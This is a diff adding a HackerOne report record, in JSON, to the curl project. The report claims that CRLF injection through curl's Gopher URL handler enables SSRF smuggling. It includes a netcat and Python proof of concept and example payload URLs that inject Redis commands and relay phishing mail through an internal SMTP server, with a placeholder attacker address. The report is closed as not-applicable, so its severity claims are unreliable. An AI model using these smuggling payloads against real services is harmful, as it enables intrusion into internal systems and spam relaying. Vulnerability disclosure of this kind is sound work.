@@ -1,0 +1,136 @@
+{
+  "id": 3508785,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNTA4Nzg1",
+  "url": "https://hackerone.com/reports/3508785",
+  "title": "Gopher Protocol Command Injection (SSRF Smuggling)",
+  "state": "Closed",
+  "substate": "not-applicable",
+  "severity_rating": "high",
+  "readable_substate": "N/A",
+  "created_at": "2026-01-13T13:16:23.566Z",
+  "submitted_at": "2026-01-13T13:16:23.964Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "andrew-bbp",
+    "url": "/andrew-bbp",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-01-14T09:32:16.666Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2026-01-13T22:54:15.032Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary\nThe `curl` Gopher protocol handler is vulnerable to command injection through URL-encoded CRLF sequences in the path. This allows an attacker to \"smuggle\" additional Gopher selectors or arbitrary commands into a single Gopher request. By using `%0d%0a` in the URL, an attacker can break the line-delimited Gopher protocol and force `curl` to send multiple distinct request lines to the server.\n\n## Affected Component\n- **File:** `lib/gopher.c`\n- **Function:** `gopher_do`\n- **Line:** 101\n- **Vulnerable Code:** `Curl_urldecode` call with `REJECT_ZERO` flag\n\n## Vulnerability Details\n\n### Root Cause\nIn `lib/gopher.c`, the Gopher protocol handler extracts the selector from the URL and decodes it using `Curl_urldecode` with the `REJECT_ZERO` flag:\n\n```c\n/* lib/gopher.c:101 */\nresult = Curl_urldecode(newp, 0, &buf_alloc, &buf_len, REJECT_ZERO);\n```\n\nThe `REJECT_ZERO` flag only prevents null bytes (`%00`) from being decoded. All other control characters, including:\n- Carriage Return (`%0d` / `\\r`)\n- Line Feed (`%0a` / `\\n`)\n\nare decoded into the raw buffer `buf_alloc` and subsequently sent to the server.\n\n### Attack Mechanism\nThe Gopher protocol is line-delimited. After decoding the selector, `curl` sends it to the server followed by a hardcoded CRLF:\n\n```c\n/* lib/gopher.c:110 */\nresult = Curl_xfer_send(data, buf, buf_len, FALSE, &nwritten);\n...\n/* lib/gopher.c:156 */\nresult = Curl_xfer_send(data, \"\\r\\n\", 2, FALSE, &nwritten);\n```\n\nIf an attacker provides a URL like:\n```\ngopher://example.com/1/selector%0d%0aINJECTED_COMMAND\n```\n\nThe resulting network transmission will be:\n```\nselector\\r\\n\nINJECTED_COMMAND\\r\\n\n```\n\nA standard Gopher server processes each line independently, so it will see:\n1. A request for `selector`\n2. A second, attacker-controlled request for `INJECTED_COMMAND`\n\n## Proof of Concept\n\n### Step 1: Start a Listener\nOpen a terminal and start a netcat listener to observe the raw protocol traffic:\n\n```bash\nnc -l -p 7070\n```\n\n### Step 2: Execute the Attack\nIn another terminal, run curl with the malicious Gopher URL:\n\n```bash\ncurl -v \"gopher://localhost:7070/1/first-command%0d%0asecond-command\"\n```\n\n### Step 3: Observe the Result\nIn the netcat listener terminal, you will see two distinct lines:\n\n```\nfirst-command\nsecond-command\n```\n\nThis proves that the attacker can inject arbitrary commands into the Gopher protocol stream.\n\n### Alternative PoC (Python)\nYou can also use this Python script to verify:\n\n```python\nimport socket\n\n# Start a simple Gopher server\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\ns.bind(('127.0.0.1', 7070))\ns.listen(1)\nprint(\"Gopher server listening on port 7070...\")\n\nconn, addr = s.accept()\ndata = conn.recv(1024).decode()\nprint(\"=== Received Data ===\")\nprint(repr(data))\nprint(\"\\n=== Parsed Lines ===\")\nfor line in data.split('\\r\\n'):\n    if line:\n        print(f\"Command: {line}\")\nconn.close()\ns.close()\n```\n\nRun this script, then execute:\n```bash\ncurl \"gopher://localhost:7070/1/legitimate%0d%0ainjected%0d%0amalicious\"\n```\n\nExpected output:\n```\n=== Received Data ===\n'legitimate\\r\\ninjected\\r\\nmalicious\\r\\n'\n\n=== Parsed Lines ===\nCommand: legitimate\nCommand: injected\nCommand: malicious\n```\n\n## Impact\n\n### SSRF Enhancement\nThis vulnerability significantly enhances Server-Side Request Forgery (SSRF) attacks. If a web application allows users to provide a URL that is fetched by `curl`, an attacker can:\n\n1. **Smuggle commands to internal Gopher servers**\n   - Send multiple queries in a single request\n   - Bypass rate limiting or logging mechanisms\n\n2. **Communicate with other line-delimited internal services**\n   - Redis (if accessible via Gopher port or through port confusion)\n   - SMTP servers\n   - Memcached\n   - Custom internal protocols\n\n3. **Bypass security controls**\n   - WAFs that only inspect the URL path\n   - Logging systems that record only the initial request\n\n### Attack Scenarios\n\n**Scenario 1: Redis Command Injection**\n```\ngopher://internal-redis:6379/1/SET%20key%20value%0d%0aGET%20sensitive_data\n```\n\n**Scenario 2: SMTP Relay**\n```\ngopher://mail-server:25/1/MAIL%20FROM:<attacker@evil.com>%0d%0aRCPT%20TO:<victim@target.com>%0d%0aDATA%0d%0aSubject:%20Phishing\n```\n\n## Recommendation\n\n### Fix\nUpdate `lib/gopher.c` to use `REJECT_CTRL` or `REJECT_CTRL_ZERO` instead of `REJECT_ZERO` in the `Curl_urldecode` call:\n\n```c\n/* lib/gopher.c:101 - FIXED */\nresult = Curl_urldecode(newp, 0, &buf_alloc, &buf_len, REJECT_CTRL);\n```\n\nThis will prevent the decoding of newlines and other control characters that can be used to manipulate the protocol stream.\n\n### Verification\nAfter applying the fix, the PoC should fail with an error indicating that control characters are not allowed in the URL.",
+  "weakness": {
+    "id": 68,
+    "name": "Server-Side Request Forgery (SSRF)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 5220835,
+      "file_name": "gopher.mp4",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/byswh457zhjn67n36b81hwmh93bh?response-content-disposition=attachment%3B%20filename%3D%22gopher.mp4%22%3B%20filename%2A%3DUTF-8%27%27gopher.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTPZNC2VJ%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T145933Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB0aCXVzLXdlc3QtMiJGMEQCIGOeIibeIlvktPdkcStOSMyU%2BbReWiC5UQVnbnI09Dl6AiAO%2B%2F%2FrSMhUx9tMfmb5wIaMiLJHENuUWzc5tsWbhQc32Cq7BQjm%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIM7lRrW6AbiHpdNCIHKo8Fj7UpLQFh4zMnY3jGeICstGG8v%2FPO1jy3cZ6pxg2iglcoO4hdCgLoCVfjbpXEr5oH6DeQ7QumDpuR88zYEQRX1fm%2B5a5s7zZseogxgL0yPGsD276UAhyRN06IGxX8kuQh%2BS8%2FHm5f9z7oeTCH8XjMPjqVQNS5JQXHFrq3ImSipju3FjHPHHH8lNCBOLo%2FkLjPVRHEpaTUT4C%2FNPN8xP%2Bq1IUC4ag3rNUCxlPI6T7081U6GmmOK8gUJoP1uVkbAq4LQRPW7tlB1OHN1ZMTsx13xfmDOLER8E2%2FAGzzK554W6X8Ctt7ilZo1GzZgDLjYCpCt0Gnne7879XyFq1n1xiUEHT7cSwo2Y9S35ht1R%2BnJQylPDRQPphpn%2B7O5KNquVqyorZm7H%2FJFNJ5Ia3P3Syy7ah5dPmvGzqOfLotWR%2BquHdXEOL2ImRrgO6Z7%2BU4d47EhdzaLDYS9f1AgftmrmfftYclEqPtKDJArjzwPLWgMfCchojdpYtq1lOrhkgR4cBYtNgz%2BjyoUtgmeQxR5NjLYRVURU96cLCpxfy69b90xiFVDxhiraDaNPrVm6GfVYzhOsd0XEYeLtrYo54dM0cH9kXYhpRv5Ju5EzVwA7Nv%2ByP9lkkh1XU64ar4vmguOsqeVElLDV8X7xz%2B3TODfas0HHViY%2FtdeZSEB99TwyrDaKSFmbqSUiaeLR3j78MN9FwFy6utGKRqvIe8L6dudilN6I8H5K8tZlrN9k320He41mPkysTJj9wP6S5YhlhUejzYfKszsitH%2BbLBuwS%2FnQbw2UKB7vFLB1B%2Bafnq7YdvxYO2%2BJNsKbTacfDyLuQQYFx5hBXBs9hgXGzuqRH7dvZOM%2FdtByRIyRLdJYhcVPVSxTDHz%2FzPBjqyAcY36EefNEghHwns%2Fo6uJ3AEdiibcs%2BhCBgAk%2B3aIepi4wvsnI7yj8jFI89K%2F22lH6wMbBDrmUekh0364CYpSweyTZtj1SD%2BHzwcBIRjsrqIDgyK6fHWvErhgkfhGFwVAQKLKHroZA1yYxJP22Ym86HUnEl1CLH6oUILUz%2Fus2VgH4vR%2FLgGUvteZpqXMlTlBo0bspGXBzMaA4sNGBThC6dWB6rZjuarVh7e5e%2BEy1DaGn8%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=82048e27a9b76c9fb94c0557b837a48dcc430c26c22a261b2ba2f22e9b76a088",
+      "file_size": 793540,
+      "type": "video/mp4",
+      "moderated": null
+    },
+    {
+      "id": 5220844,
+      "file_name": "gopher_poc.py",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ymwp16oky9524ql9fl0q2int7gpc?response-content-disposition=attachment%3B%20filename%3D%22gopher_poc.py%22%3B%20filename%2A%3DUTF-8%27%27gopher_poc.py&response-content-type=text%2Fx-python&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTPZNC2VJ%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T145933Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB0aCXVzLXdlc3QtMiJGMEQCIGOeIibeIlvktPdkcStOSMyU%2BbReWiC5UQVnbnI09Dl6AiAO%2B%2F%2FrSMhUx9tMfmb5wIaMiLJHENuUWzc5tsWbhQc32Cq7BQjm%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIM7lRrW6AbiHpdNCIHKo8Fj7UpLQFh4zMnY3jGeICstGG8v%2FPO1jy3cZ6pxg2iglcoO4hdCgLoCVfjbpXEr5oH6DeQ7QumDpuR88zYEQRX1fm%2B5a5s7zZseogxgL0yPGsD276UAhyRN06IGxX8kuQh%2BS8%2FHm5f9z7oeTCH8XjMPjqVQNS5JQXHFrq3ImSipju3FjHPHHH8lNCBOLo%2FkLjPVRHEpaTUT4C%2FNPN8xP%2Bq1IUC4ag3rNUCxlPI6T7081U6GmmOK8gUJoP1uVkbAq4LQRPW7tlB1OHN1ZMTsx13xfmDOLER8E2%2FAGzzK554W6X8Ctt7ilZo1GzZgDLjYCpCt0Gnne7879XyFq1n1xiUEHT7cSwo2Y9S35ht1R%2BnJQylPDRQPphpn%2B7O5KNquVqyorZm7H%2FJFNJ5Ia3P3Syy7ah5dPmvGzqOfLotWR%2BquHdXEOL2ImRrgO6Z7%2BU4d47EhdzaLDYS9f1AgftmrmfftYclEqPtKDJArjzwPLWgMfCchojdpYtq1lOrhkgR4cBYtNgz%2BjyoUtgmeQxR5NjLYRVURU96cLCpxfy69b90xiFVDxhiraDaNPrVm6GfVYzhOsd0XEYeLtrYo54dM0cH9kXYhpRv5Ju5EzVwA7Nv%2ByP9lkkh1XU64ar4vmguOsqeVElLDV8X7xz%2B3TODfas0HHViY%2FtdeZSEB99TwyrDaKSFmbqSUiaeLR3j78MN9FwFy6utGKRqvIe8L6dudilN6I8H5K8tZlrN9k320He41mPkysTJj9wP6S5YhlhUejzYfKszsitH%2BbLBuwS%2FnQbw2UKB7vFLB1B%2Bafnq7YdvxYO2%2BJNsKbTacfDyLuQQYFx5hBXBs9hgXGzuqRH7dvZOM%2FdtByRIyRLdJYhcVPVSxTDHz%2FzPBjqyAcY36EefNEghHwns%2Fo6uJ3AEdiibcs%2BhCBgAk%2B3aIepi4wvsnI7yj8jFI89K%2F22lH6wMbBDrmUekh0364CYpSweyTZtj1SD%2BHzwcBIRjsrqIDgyK6fHWvErhgkfhGFwVAQKLKHroZA1yYxJP22Ym86HUnEl1CLH6oUILUz%2Fus2VgH4vR%2FLgGUvteZpqXMlTlBo0bspGXBzMaA4sNGBThC6dWB6rZjuarVh7e5e%2BEy1DaGn8%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=2943328852c93ac9a5367abc4d8efb29eaa6bb11afcf8486428d08e6b49632bd",
+      "file_size": 1284,
+      "type": "text/x-python",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 7,
+  "voters": [
+    "2026",
+    "mr-inspector",
+    "l0bo",
+    "stationarydev37",
+    "shadowbr4ak",
+    "hunta",
+    "therealgodzer0"
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
